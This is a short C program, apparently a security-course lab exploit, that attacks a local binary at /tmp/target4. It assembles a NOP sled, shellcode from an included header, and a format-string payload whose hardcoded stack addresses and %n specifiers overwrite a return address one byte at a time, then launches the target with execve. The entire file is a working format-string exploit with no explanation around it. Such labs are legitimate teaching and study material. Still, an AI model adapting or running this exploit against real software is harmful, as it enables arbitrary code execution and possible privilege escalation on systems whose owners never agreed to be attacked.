#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char attack_string[400];
  memset(attack_string, '\x90', sizeof(attack_string));
  attack_string[sizeof(attack_string)-1] = '\0';
  
  memcpy(attack_string + sizeof(attack_string) - strlen(shellcode) - 4, shellcode, strlen(shellcode));
  
  char *format_string;
  format_string = "\xff\xff\xff\xff\x3c\xfb\xff\xbf" //bffffb3c
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf" //bffffb3d
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf" //bffffb3e
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf" //bffffb3f
        "%111u%n%111u%n%257u%n%192u%n";

  memcpy(attack_string, format_string, strlen(format_string));
  
  char *args[] = { TARGET, attack_string, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
